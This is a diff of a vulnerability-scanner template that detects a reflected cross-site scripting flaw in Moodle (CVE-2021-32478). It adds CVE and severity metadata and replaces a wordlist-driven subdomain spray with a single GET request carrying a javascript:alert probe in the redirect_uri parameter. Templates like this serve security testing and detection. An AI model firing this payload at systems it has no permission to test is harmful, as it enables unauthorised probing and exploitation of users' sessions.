@@ -1,26 +1,26 @@
 id: moodle-xss
 
 info:
-  name: Moodle redirect_uri Reflected XSS
+  name: Moodle - Cross-Site Scripting
   author: hackergautam
-  description: XSS in moodle via redirect_uri parameter
   severity: medium
+  description: Moodle 3.10 to 3.10.3, 3.9 to 3.9.6, 3.8 to 3.8.8, and earlier unsupported versions contain a cross-site scripting vulnerability via the redirect_uri parameter.
+  reference:
+    - https://twitter.com/JacksonHHax/status/1391367064154042377
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-32478
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
   tags: moodle,xss
-  reference: https://twitter.com/JacksonHHax/status/1391367064154042377
+  metadata:
+    max-request: 1
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert('{{randstr}}')"
 
-    raw:
-      - |
-        GET /mod/lti/auth.php?redirect_uri=javascript:alert('{{randstr}}') HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
@@ -38,3 +38,5 @@ requests:
         part: header
         words:
           - "text/html"
+
+# Enhanced by md on 2022/09/19
